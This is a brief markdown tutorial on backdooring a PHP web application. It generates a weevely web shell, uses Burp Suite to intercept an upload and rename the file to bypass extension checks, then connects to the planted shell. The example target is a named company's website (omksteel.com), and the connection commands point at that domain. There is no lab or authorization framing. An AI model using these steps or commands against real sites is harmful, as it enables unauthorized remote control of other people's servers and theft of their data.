# Instruction

With a combination of [Burp Suite](https://portswigger.net/burp) and [weevely](https://www.kali.org/tools/weevely/) you can create a backdoor in a PHP application, such as [OMK's Website](https://omksteel.com/company/contacts/). You need to intercept using [Burp Suite](https://portswigger.net/burp) when the file is being uploaded and change the `filename`, most probably because the application won't allow `.php` extensions directly.

Create the backdoor `weevely generate s3cr3t`

Find an URL to upload a file. The moment when the file is being uploaded, you can intercept the request and change the uploaded file from, for example `shell.png` (if the website allows `.png` files), to `shell.php` which is basically your backdoor.

It might be also not possible to do so, then you can try to upload `shell.php.png`. Some ideas can be found here: https://github.com/imran-parray/Web-Sec-CheatSheet/blob/master/File-Upload-test.txt

Then connect to it using `weevely https://omksteel.com/sample/url/shell.php s3cr3t`, where `s3cr3t` is the password you've created when generating the backdoor `shell.php` file using `weevely`, or most probably something more sophisticated, like `weevely https://omksteel.com/sample/url/shell.php.png s3cr3t`.

More reading about file upload: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
